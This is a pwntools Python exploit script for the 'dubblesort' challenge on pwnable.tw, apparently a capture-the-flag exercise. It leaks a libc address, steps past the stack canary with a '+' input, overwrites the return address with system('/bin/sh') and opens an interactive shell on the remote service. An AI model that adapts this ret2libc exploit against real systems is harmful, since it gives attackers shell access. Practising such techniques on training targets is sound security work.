#!/usr/bin/env python

from pwn import *

#r = process('./dubblesort', env={'LD_PRELOAD':'./libc_32.so.6'})
r = remote("chall.pwnable.tw", 10101)

libc = ELF('./libc_32.so.6')

offset = 0xf771f000 - 0xf756f000

def mysend(s):
    r.recvuntil(':')
    r.sendline(s)

mysend('a' * 24)
r.recvline()
base = u32('\x00' + r.recv(3)) - offset
system = base + libc.symbols['system']
shell = base + next(libc.search('/bin/sh\x00'))

log.info(hex(base))

mysend('36')

for i in range(24):
    mysend('1')

mysend('+')

for i in range(8):
    mysend(str(system))

for i in range(3):
    mysend(str(shell))

r.interactive()
